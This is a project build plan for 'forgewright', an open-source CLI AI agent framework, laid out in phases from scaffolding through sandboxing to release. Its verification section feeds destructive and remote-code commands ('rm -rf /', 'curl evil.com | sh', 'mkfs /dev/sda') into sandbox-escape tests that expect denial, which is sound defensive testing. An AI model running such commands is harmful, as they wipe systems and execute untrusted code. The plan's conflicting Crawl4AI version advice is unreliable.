# forgewright — Build Plan

> **Status:** v0.1, in planning. Last updated 2026-06-02.
> **Owner:** Forest. **Reviewers:** TBD. **Target first release:** 8–10 weeks from kickoff.

This is the implementation plan for `forgewright`, a CLI-first, open-source, BYO-keys AI agent framework. The research that justifies every decision in this plan is in [`docs/RESEARCH.md`](./docs/RESEARCH.md); the user-facing landing page is in [`README.md`](./README.md).

---

## 0. Goals & non-goals

**Goals (v0.1)**
- A real CLI binary (`forgewright`) you can install with one command and pipe into other tools.
- A layered agent stack: `BaseAgent → ReActAgent → ToolCallAgent → Manus → {DataAnalysis, BrowserAgent, MCPAgent}`.
- The 8 core tools the spec calls for: `PythonExecute`, `StrReplaceEditor`, `BrowserUseTool`, `Bash`, `WebSearch`, `AskHuman`, `Terminate`, `Crawl`.
- Multi-provider LLM support via LiteLLM (OpenAI, Anthropic, Google, Azure, Bedrock, Ollama) with a working stub provider.
- MCP client (SSE + stdio + Streamable HTTP) and a FastMCP server.
- A working `PlanningFlow` for multi-agent orchestration.
- Default-deny sandboxing, dangerous-command denylist, sha256-chained audit log.
- `config.toml` for everything, env-var fallbacks, keyring-backed secrets.
- Loguru logging, Pydantic v2 models, async throughout.
- End-to-end verified: a smoke test runs `main.py` with the stub provider, uses ≥1 tool, exits cleanly.

**Non-goals (v0.1)**
- A web UI / TUI alt-screen (we use rich-streaming in a normal REPL; a Textual TUI is v0.2).
- A hosted service, telemetry, account system, or any SaaS surface.
- Self-update (`uv tool upgrade` is the upgrade path).
- Single-binary distribution (Playwright + Crawl4AI break bundling).
- Daytona cloud integration (stubbed; the `Sandbox` interface stays pluggable for E2B / Modal in v0.2).
- Windows ARM64 wheels (linux/amd64 + linux/arm64 + macos are v0.1; Windows is v0.2).

---

## 1. Tech stack (decisions)

| Layer | Choice | Why |
|---|---|---|
| Project / packaging | `uv` 0.11+ | 2026 default; one tool for venv, lock, build, publish |
| Build backend | `hatchling` | Simpler than setuptools; no dynamic-version trap |
| Lint / format | `ruff` 0.5+ | Fast, single tool, replaces flake8+isort+black |
| Type check | `mypy` 1.10+ strict on `src/` | Catches Pydantic misuse early |
| Tests | `pytest` 8+ + `pytest-asyncio` | Standard for async code |
| Models | `pydantic` 2.13+ | `extra="forbid"` to catch provider drift |
| Settings | `pydantic-settings` 2.14+ | TOML + env + dotenv, threaded singleton |
| LLM gateway | `litellm` 1.86+ | 100+ providers, async, streaming; OpenAI Agents SDK uses it |
| Anthropic SDK | `anthropic` 0.105+ | For token-count endpoint, fine-grained streaming |
| MCP server | `fastmcp` 3.3+ | 70% of MCP servers use it; auto-schema from type hints |
| MCP client | `mcp` 1.27+ (official SDK) | Lower-level primitive for proxy pattern |
| Browser | `playwright` 1.55+ | Persistent context for sessions; `page.accessibility.snapshot()` for LLM |
| Token counting | `tiktoken` (OpenAI) + `client.messages.count_tokens` (Anthropic) | Tiktoken is OpenAI-only; use the provider's endpoint for others |
| Retry | `tenacity` 9.1+ | `wait_random_exponential(multiplier=1, min=2, max=60)`, 7 attempts |
| Logging | `loguru` 0.7+ | `enqueue=True` for multi-proc; explicit `colorize=True` in CI |
| Charts | `altair` 6+ | Declarative JSON spec; LLM-friendly; PSF-licensed |
| Crawler | `crawl4ai` 0.8.7+ | Pin <0.8.7 to avoid the supply-chain incident |
| Container | `docker` 7.1+ (PyPI) | Hard limits: `mem_limit=512m`, `pids_limit=256`, `network_mode="none"`, `read_only=True` |
| Terminal UX | `rich` 14+ + `prompt_toolkit` 3.0+ | Aider's pattern; works in plain line-mode REPL |
| CLI framework | `typer` 0.12+ | Built on click, uses type hints, integrates with rich |
| HTTP | `httpx` 0.27+ | Async, used by MCP client |
| Secrets | `keyring` | OS keyring preferred over env over file |
| Secret scanning | `gitleaks` + `trufflehog` in CI | Pre-commit + PR diff scanning |
| SBOM | CycloneDX via `uv export --format cyclonedx1.5` | PEP 740 attestations on PyPI |

---

## 2. Repository layout

```
forgewright/
├── pyproject.toml
├── README.md
├── BUILD_PLAN.md
├── LICENSE                                # MIT
├── CHANGELOG.md
├── CODE_OF_CONDUCT.md
├── .gitignore
├── .pre-commit-config.yaml
├── config.toml.example                    # documented default
├── docs/
│   ├── RESEARCH.md                        # full research synthesis
│   ├── ARCHITECTURE.md                    # deep dive on the agent stack
│   ├── SECURITY.md                        # threat model + sandbox + audit
│   ├── recipes/
│   │   ├── refactor.md
│   │   ├── audit.md
│   │   ├── dashboard.md
│   │   └── postgres.md
│   └── images/                            # logo, demo gif, mermaids
├── .github/
│   ├── workflows/
│   │   ├── ci.yml                         # lint + mypy + pytest, 3 OS × 3 Python
│   │   ├── publish.yml                    # uv publish on tag, trusted publishing
│   │   ├── docker.yml                     # multi-arch buildx, push to ghcr.io
│   │   ├── homebrew.yml                   # update tap formula on release
│   │   ├── security.yml                   # gitleaks + trufflehog + pip-audit
│   │   └── stale.yml                      # close abandoned issues
│   ├── ISSUE_TEMPLATE/
│   └── PULL_REQUEST_TEMPLATE.md
├── src/forgewright/
│   ├── __init__.py
│   ├── __main__.py                        # `python -m forgewright`
│   ├── cli/
│   │   ├── __init__.py
│   │   ├── app.py                         # typer root, shared options
│   │   ├── main.py                        # `forgewright build "..."` (single prompt → Manus)
│   │   ├── run_flow.py                    # `forgewright flow "..."` (PlanningFlow, 60min timeout)
│   │   ├── run_mcp.py                     # `forgewright mcp ...` (MCPAgent)
│   │   ├── run_mcp_server.py              # `forgewright mcp serve` (FastMCP host)
│   │   ├── init.py                        # `forgewright init` (first-run wizard)
│   │   ├── trust.py                       # `forgewright trust <pattern> --scope=...`
│   │   ├── audit.py                       # `forgewright audit verify / tail / export`
│   │   ├── sandbox.py                     # `forgewright sandbox doctor / set`
│   │   ├── mcp.py                         # `forgewright mcp ls / install / trust`
│   │   └── stream.py                      # rich Live + markdown streaming
│   ├── config.py                          # Settings(BaseSettings), TOML + env + keyring
│   ├── schema.py                          # Pydantic messages, ToolCall, ToolResult
│   ├── logger.py                          # loguru setup, file + console
│   ├── memory.py                          # bounded message history, LoopGuard
│   ├── llm/
│   │   ├── __init__.py
│   │   ├── base.py                        # LLM Protocol: ask(), ask_tool(), count_tokens()
│   │   ├── litellm_backend.py             # routes via litellm.acompletion
│   │   ├── stub.py                        # deterministic scripted responses
│   │   ├── errors.py                      # TokenLimitExceeded, ProviderError, etc.
│   │   └── retry.py                       # tenacity decorators
│   ├── agent/
│   │   ├── __init__.py
│   │   ├── base.py                        # BaseAgent, AgentState enum, step loop
│   │   ├── react.py                       # ReActAgent (think/act)
│   │   ├── tool_call.py                   # ToolCallAgent (structured function calling)
│   │   ├── manus.py                       # top-level orchestrator
│   │   ├── data_analysis.py
│   │   ├── browser_agent.py
│   │   ├── mcp_agent.py
│   │   └── prompts/                       # system prompts as .md files, loaded at runtime
│   ├── tool/
│   │   ├── __init__.py
│   │   ├── base.py                        # BaseTool, ToolResult
│   │   ├── collection.py                  # ToolCollection
│   │   ├── registry.py                    # namespacing, allowlist
│   │   ├── python_execute.py              # subprocess + Docker modes
│   │   ├── str_replace_editor.py          # view/create/str_replace/insert/undo_edit
│   │   ├── browser.py                     # BrowserUseTool
│   │   ├── bash.py                        # persistent async shell
│   │   ├── web_search.py                  # Google→DDG→Baidu→Bing chain
│   │   ├── crawl.py                       # Crawl4AI wrapper
│   │   ├── ask_human.py
│   │   ├── terminate.py
│   │   └── data_visualization.py          # altair render → PNG/HTML
│   ├── flow/
│   │   ├── __init__.py
│   │   ├── planning.py                    # PlanningFlow
│   │   └── planning_tool.py               # create/update/mark_step
│   ├── mcp/
│   │   ├── __init__.py
│   │   ├── client.py                      # dynamic discovery, proxy to BaseTool
│   │   ├── server.py                      # FastMCP app exposing local tools
│   │   └── registry.py                    # talk to https://registry.modelcontextprotocol.io
│   ├── sandbox/
│   │   ├── __init__.py                    # Sandbox Protocol
│   │   ├── subprocess_sandbox.py          # default; 5s timeout, no FS limits
│   │   ├── docker_sandbox.py              # hard limits; recommended
│   │   ├── gvisor_sandbox.py              # stronger isolation
│   │   └── firecracker_sandbox.py         # v0.2; multi-tenant hostile workloads
│   ├── security/
│   │   ├── __init__.py
│   │   ├── denylist.py                    # 20 regex patterns + an allowlist
│   │   ├── approval.py                    # interactive prompt, session/repo/machine scopes
│   │   ├── secrets.py                     # keyring > env > file; redaction
│   │   └── audit.py                       # sha256-chained JSONL writer + verifier
│   └── workspace.py                       # workspace/ root, path confinement
├── tests/
│   ├── conftest.py
│   ├── unit/                              # mirrors src/ tree
│   ├── integration/
│   │   ├── test_end_to_end.py             # main.py with stub provider
│   │   ├── test_mcp_round_trip.py
│   │   └── test_sandbox_escape_attempts.py
│   └── fixtures/
│       └── config.toml
├── workspace/                             # agent output (gitignored except .gitkeep)
└── scripts/
    ├── smoke.sh                           # `uv run forgewright build "ping"` exit 0
    └── demo-record.sh                     # asciinema script for README demo
```

---

## 3. Phased plan

Twelve phases, each with a verifiable exit criterion. The phases are ordered so a usable-but-thin version is shippable at the end of every phase boundary.

### Phase 0 — Scaffold (≈1 day)
**Tasks**
- Initialize `uv` project; commit `pyproject.toml` (template in `docs/RESEARCH.md`).
- License, README, BUILD_PLAN, `.gitignore`, `CODE_OF_CONDUCT`, `CONTRIBUTING`.
- Set up GitHub repo with branch protection, issue templates, PR template.
- CI: ruff + mypy + pytest, 3 OS × 3 Python (3.11/3.12/3.13), fail-fast off.
- Add `config.toml.example` and `forgewright init` stub.

**Exit criterion**
`uv sync && uv run pytest -q` is green; `uv run forgewright --help` prints help; `forgewright init` writes `~/.config/forgewright/config.toml`.

### Phase 1 — Configuration & logging (≈2 days)
**Tasks**
- `config.py` (Pydantic Settings): TOML + env + dotenv, `env_prefix="FORGEWRIGHT_"`, `extra="forbid"`. Thread-safe singleton via `lru_cache`.
- `logger.py` (loguru): console + `logs/{timestamp}.log`; `enqueue=True`; color on TTY.
- `secrets.py`: keyring-first resolution, `secrets.toml` fallback with `0600`.
- `schema.py`: `Role`, `ChatMessage`, `ToolCall`, `ToolResult`, `TokenUsage`, `AgentState` (IDLE/RUNNING/FINISHED/ERROR).

**Exit criterion**
`forgewright config show` prints the resolved config with secret values masked; running with `FORGEWRIGHT_LOG=DEBUG` produces colorized debug logs to file and stderr.

### Phase 2 — LLM abstraction (≈3 days)
**Tasks**
- `llm/base.py`: `LLM` Protocol with `ask(messages)`, `ask_tool(messages, tools)`, `count_tokens(messages)`, `max_context_tokens()`. Pydantic return types.
- `llm/litellm_backend.py`: thin wrapper that calls `litellm.acompletion`, normalizes responses, streams.
- `llm/stub.py`: deterministic scripted responses for tests; rotates through a JSONL of scripted turns; supports `ask_tool` and rate-limit simulation.
- `llm/retry.py`: tenacity decorator distinguishing 429/5xx/timeout (retryable) from 400/permission (non-retryable); honors `Retry-After`; raises `TokenLimitExceeded` (non-retryable).
- `llm/errors.py`: `TokenLimitExceeded`, `ProviderError`, `ContextLengthExceeded`, `RateLimited`.
- Tests with `respx` to mock OpenAI/Anthropic endpoints; verify retry behavior; verify streaming chunk assembly.

**Exit criterion**
`forgewright ask "say hi"` with `provider="stub"` prints a streamed response; with `provider="openai"` and a real key, it streams; injecting a 429 triggers exponential backoff; a `ContextLengthExceeded` raises immediately.

### Phase 3 — Tool foundation (≈2 days)
**Tasks**
- `tool/base.py`: `BaseTool` ABC with `name`, `description`, `args_schema` (JSON Schema), `requires`, `returns_image`, `to_openai_tool()`, `to_anthropic_tool()`, async `__call__(**kwargs) → ToolResult`.
- `tool/collection.py`: `ToolCollection` with `__call__(name, **kwargs)`, `add(tool)`, `namespaced_names()`. Permission/allowlist hook.
- `tool/registry.py`: namespacing (`<server_id>__<tool_name>`), discovery, allowlist enforcement.
- `tool/terminate.py` (1-line tool — `{"reason": str}` → `ToolResult(output="Goodbye.")`, sets agent state to FINISHED).
- `tool/ask_human.py` (interactive Rich prompt → user text).
- Tests for collection routing, namespacing, schema validation.

**Exit criterion**
A 30-line script that builds a `ToolCollection([Terminate(), AskHuman()])`, calls each, and asserts the result.

### Phase 4 — File & shell tools (≈3 days)
**Tasks**
- `tool/str_replace_editor.py`: view/create/str_replace/insert/undo_edit; path-confinement check (`workspace/` root by default; can be overridden); `os.path.realpath` prefix check; reject writes outside allowed roots unless `allow_outside_workspace=True`.
- `tool/bash.py`: persistent async shell via `asyncssh` or `pexpect`; history; dangerous-pattern denylist (20 patterns from security plan); per-call approval flow.
- `tool/python_execute.py`: `subprocess` mode (default for trust), `docker` mode (`Sandbox` interface). 5s timeout in subprocess; configurable.
- `tool/web_search.py`: Google → DuckDuckGo → Baidu → Bing chain with `tenacity` exponential backoff per engine; result normalization to `[{title, url, snippet}]`.
- Tests for editor undo, bash denylist, Python sandbox confinement, search fallback chain (mocked).

**Exit criterion**
A test that has the agent edit a file, run it, capture the output, and clean up. Bash refuses `rm -rf /` even when allowlisted empty.

### Phase 5 — Browser tool (≈4 days)
**Tasks**
- `tool/browser.py`: Playwright persistent context; tab management; `page.accessibility.snapshot()` for LLM-readable DOM; screenshot as base64 JPEG; navigate/click/type/extract.
- Session lifecycle: open on first use, close on agent cleanup, support `--browser-headless` (default true) and `--browser-disable-security`.
- `browser_agent.py` thin wrapper that pre-loads BrowserUseTool and bans everything else.
- Integration test that visits example.com, extracts the title, takes a screenshot.

**Exit criterion**
`forgewright browse "fetch the title of example.com"` returns "Example Domain" and a base64 PNG.

### Phase 6 — Manus agent (≈3 days)
**Tasks**
- `agent/base.py`: `BaseAgent` with `AgentState`, `Memory` (bounded deque + LoopGuard), `step()`, `run()`.
- `agent/react.py`: `ReActAgent` with explicit `think()` and `act()` methods; uses the stub or any non-tool LLM.
- `agent/tool_call.py`: `ToolCallAgent` — parse tool calls, validate against schema, dispatch through `ToolCollection`.
- `agent/manus.py`: `Manus` — wires together browser, python, file_editor, web_search, mcp, ask_human, terminate, data_viz.
- `agent/prompts/*.md` for each agent.
- Tests for state transitions, loop detection, tool dispatch, max-steps cap.

**Exit criterion**
A scripted test: `Manus(stub_provider, tools=[...])` runs to `FINISHED` in ≤8 steps; a second test deliberately loops, gets nudged, finishes.

### Phase 7 — Sub-agents (≈3 days)
**Tasks**
- `agent/data_analysis.py`: adds `DataVisualization` (altair) and the data-analysis prompt.
- `agent/browser_agent.py`: browser-only.
- `agent/mcp_agent.py`: dedicated MCP lifecycle.
- Tests for each.

**Exit criterion**
`DataAnalysis` produces a chart PNG in `workspace/`; `BrowserAgent` solves a 2-page navigation task; `MCPAgent` proxies a mock MCP server's tool.

### Phase 8 — MCP integration (≈4 days)
**Tasks**
- `mcp/client.py`: dynamic `ListTools`, wrap each as `MCPToolProxy(BaseTool)`; handle stdio + Streamable HTTP + legacy SSE.
- `mcp/server.py`: FastMCP app exposing Bash, StrReplaceEditor, BrowserUseTool, Terminate; mount in FastAPI with proper `lifespan`.
- `mcp/registry.py`: optional one-line install from `https://registry.modelcontextprotocol.io/v0/servers`.
- `cli/run_mcp.py`: `--connection stdio|sse|http`, `--server-url`, `--interactive`, `--prompt`.
- `cli/run_mcp_server.py`: hosts the FastMCP server.
- Integration test: spawn the server in a subprocess, connect via stdio, list tools, call `bash`, assert output.

**Exit criterion**
`forgewright mcp serve` exposes Bash + FileEditor; an external `mcp` CLI can list and call them; `forgewright mcp` connects to the reference filesystem server.

### Phase 9 — PlanningFlow (≈3 days)
**Tasks**
- `flow/planning_tool.py`: `create_steps`, `update_step`, `mark_step` (status: not_started/in_progress/completed/blocked).
- `flow/planning.py`: orchestrator that decomposes a task, allocates steps to agents, monitors status, handles blocked steps.
- `cli/run_flow.py`: 60-min timeout; `--agents manus,data_analysis,browser_agent`.
- Tests for step transitions, agent allocation, timeout.

**Exit criterion**
A test prompt like "research X, write a report, plot a chart" completes with three sub-agents and a `report.md` in `workspace/`.

### Phase 10 — Security & sandboxing (≈4 days, can start in parallel with phase 4)
**Tasks**
- `sandbox/__init__.py`: `Sandbox` Protocol — `run(cmd)`, `write(path, content)`, `read(path) → str`, `cleanup()`.
- `sandbox/subprocess_sandbox.py`: timeout, no FS limits (default).
- `sandbox/docker_sandbox.py`: hard limits; verify `mem_limit`, `pids_limit`, `network_mode`, `read_only`, `cap_drop`.
- `sandbox/gvisor_sandbox.py`: wraps Docker with `--runtime=runsc`.
- `security/denylist.py`: 20 regex patterns + a small allowlist of safe builtins.
- `security/approval.py`: Rich interactive prompt; `forgewright trust <pattern> --scope=session|repo|machine`; the allowlist is consulted before every Bash call.
- `security/audit.py`: sha256-chained JSONL writer; `forgewright audit verify` recomputes the chain; `forgewright audit tail` for live tailing; redact secrets before write.
- `cli/sandbox.py`: `forgewright sandbox doctor` (detect Docker / gVisor / Firecracker).
- `cli/trust.py`: `forgewright trust ls / add / rm`.
- Tests: attempt `rm -rf /`, `curl | sh`, `kill 1` — all denied; verify audit log chains correctly.

**Exit criterion**
Pen-test: 20 dangerous commands are all denied by default. `forgewright audit verify` passes on a 1000-event log. `forgewright sandbox doctor` reports the strongest available sandbox.

### Phase 11 — UX & session (≈4 days, starts late phase 6)
**Tasks**
- `cli/stream.py`: rich `Live` + markdown streaming pattern from `docs/RESEARCH.md` (the 10-line snippet).
- `cli/main.py`: single-shot (`forgewright build "..."`) and REPL (`forgewright`).
- Slash commands: `/help /clear /exit /resume [id] /model [name] /compact /add /drop /permissions /mcp /sandbox /status /cost /doctor /init /memory /config`.
- `permission_mode` cycle (Shift+Tab): `default / acceptEdits / plan / auto / dontAsk / bypass`.
- `~/.local/share/forgewright/sessions/<uuid>.json` with the schema from `docs/RESEARCH.md`.
- `forgewright resume [id|last]` picker.
- `forgewright cost` showing running token cost.
- Tests: stream chunks, slash-command routing, session save/restore.

**Exit criterion**
`forgewright` opens a REPL; `forgewright build "..."` runs non-interactively; Ctrl+C aborts cleanly; `/resume` lists and restores a prior session.

### Phase 12 — Distribution & release (≈3 days, last)
**Tasks**
- `cibuildwheel` matrix for linux/amd64, linux/arm64, macos x86+arm.
- Docker: `Dockerfile` multi-stage; `docker buildx` push to `ghcr.io/forest/forgewright`; embed `playwright install chromium`.
- Homebrew tap: `forest/homebrew-tap` with a formula; tap-bot updates on tag.
- Trusted publishing to PyPI via OIDC.
- Sigstore/cosign signing of wheel and Docker image.
- CycloneDX SBOM on each release.
- `pip-audit` in CI; gating merge on `pip-audit --strict`.
- Scoop manifest (Windows, v0.2 OK if not for v0.1).
- Asciinema demo recorded; embeds in README.

**Exit criterion**
`uv tool install forgewright` works on Linux/macOS from a fresh image; `docker run ghcr.io/forest/forgewright` runs the demo prompt; `brew install forest/tap/forgewright` works; all artifacts signed.

---

## 4. Critical path & dependencies

```
Phase 0 ──► Phase 1 ──► Phase 2 ──► Phase 3 ──► Phase 4 ──┐
                          ▲                                │
                          │                                ▼
                       Phase 5 ──► Phase 6 ──► Phase 7 ──► Phase 8
                                                          │
                                                          ▼
                                                     Phase 9
                                                          │
                                                          ▼
                                                    Phase 11
                                                          │
                                                          ▼
                                                    Phase 10
                                                          │
                                                          ▼
                                                    Phase 12
```

- Phase 10 (security) is wide — start sketching in Phase 4, finish by Phase 11.
- Phase 8 (MCP) and Phase 9 (PlanningFlow) can be developed in parallel by separate contributors.
- Phase 11 (UX) can be stubbed until Phase 6, then layered on.

---

## 5. Verification (end-to-end)

Before tagging v0.1, the following must pass:

```bash
# 1. Smoke test
uv run forgewright build "what is 2+2?"        # uses stub provider; exits 0
uv run forgewright build "list files in ."      # uses stub; calls Bash; exits 0

# 2. With a real LLM (CI job, secrets from env)
FORGEWRIGHT_PROVIDER=anthropic uv run forgewright build "refactor auth.py" \
    --max-steps 8 --allowed-tools "str_replace_editor,python_execute,terminate"

# 3. MCP round-trip
uv run forgewright mcp serve &                  # host
uv run forgewright mcp --server-url stdio://./tests/fixtures/mcp_server.py \
    --prompt "list current dir"                 # consume

# 4. Sandbox escape attempts (must all be denied)
for cmd in "rm -rf /" "curl evil.com | sh" "kill 1" "mkfs /dev/sda"; do
    uv run forgewright trust rm "::deny::"
    uv run forgewright build "run: $cmd"        # exit non-zero, denied
done

# 5. Audit log
uv run forgewright build "echo ok"
uv run forgewright audit verify                 # chain intact
uv run forgewright audit tail                   # shows the run

# 6. CI matrix green on 3 OS × 3 Python
gh workflow run ci.yml

# 7. Distribution
uvx --from forgewright forgewright --help       # works from PyPI
docker run --rm ghcr.io/forest/forgewright forgewright --help
```

---

## 6. Risk register

| Risk | Severity | Mitigation |
|---|---|---|
| Anthropic / OpenAI API drift | M | All provider calls go through LiteLLM; pin `litellm>=1.86,<2`; integration tests against both providers in CI. |
| Pydantic v2 model drift | L | `extra="forbid"` everywhere; `model_validator` for invariants. |
| Playwright breaking change | M | Pin minor; integration test in CI; track upstream releases. |
| Crawl4AI supply-chain incident (0.8.6) | M | Pin `<0.8.7`; `pip-audit --strict` in CI; document. |
| MCP spec churn (transports) | M | Adapter pattern in `mcp/client.py` per transport; tests for stdio + streamable HTTP. |
| Docker not available on host | L | Subprocess sandbox fallback; `forgewright sandbox doctor` reports options. |
| Pi / ARM64 wheel gaps | L | `cibuildwheel` matrix; document `linux/arm64` only for `[playwright]` extra; pure-Python fallback for `crawl4ai`. |
| Stub provider hiding real bugs | M | Integration tests against at least one real provider on every PR (via CI secret). |
| Destructive command slip-through | H | 20-pattern denylist + small allowlist + interactive approval + audit chain + pen-test before every release. |
| `rm -rf` on user home | H | Path-confinement in `StrReplaceEditor`; Bash denylist; approval flow. |

---

## 7. Open questions for the user

1. **GitHub org / handle.** Repo lives at `github.com/forest/forgewright`? Or do you have an org already?
2. **License.** MIT is the default; alternatives (Apache-2.0, BSL) are easy to swap but the ecosystem leans MIT.
3. **Default model for the demo.** Anthropic Sonnet 4.6? GPT-5? Or `provider=stub` only?
4. **Name confirmation.** Top pick is **forgewright**. Other strong options: `opencrucible`, `promethean`, `aegis`. Want to lock the name in?
5. **Trajectory.** Solo project or do you want to recruit co-maintainers early? (Affects CONTRIBUTING, governance, CODE_OF_CONDUCT timing.)
6. **First recipe.** Which of refactor / audit / dashboard / postgres should we polish as the launch demo? (Suggests prioritizing the corresponding tool + MCP server.)
7. **Multi-tenant / hosted later?** v0.1 is single-user CLI. Are you planning a hosted version? Affects auth, telemetry, and key management choices.

---

## 8. Out of scope (v0.1)

- TUI alt-screen (v0.2 — likely Textual).
- Single-binary distribution (v0.2 if at all; PyPI wheel is the primary path).
- Windows ARM64 wheels (v0.2).
- Daytona / E2B / Modal cloud sandboxes (interfaces stubbed, no provider in v0.1).
- Conversation forking (v0.2).
- Web UI (never — this is CLI-first).
- Telemetry / analytics (never — MIT + privacy).
- Self-update (v0.2 if user demand).

---

## 9. Milestones

| Milestone | End of phase | Demo |
|---|---|---|
| **M0 — Skeleton** | Phase 0 | `forgewright --help` works |
| **M1 — Stub agent** | Phase 6 | `forgewright build "..."` runs end-to-end with stub provider |
| **M2 — Real LLM** | Phase 7 | Same demo with `provider=anthropic` |
| **M3 — MCP** | Phase 8 | External MCP client uses our tools; we use the filesystem server |
| **M4 — Plan** | Phase 9 | Multi-agent recipe works |
| **M5 — Hardened** | Phase 10 | Pen-test passes; audit chain verified |
| **M6 — Polished** | Phase 11 | Full REPL UX, sessions, slash commands |
| **M7 — Released** | Phase 12 | v0.1.0 on PyPI, Homebrew, Docker, signed |

**Target:** 8–10 weeks from kickoff to M7.

---

*Last updated 2026-06-02. Edit this file as the plan evolves; keep `docs/RESEARCH.md` as the rationale source of truth.*
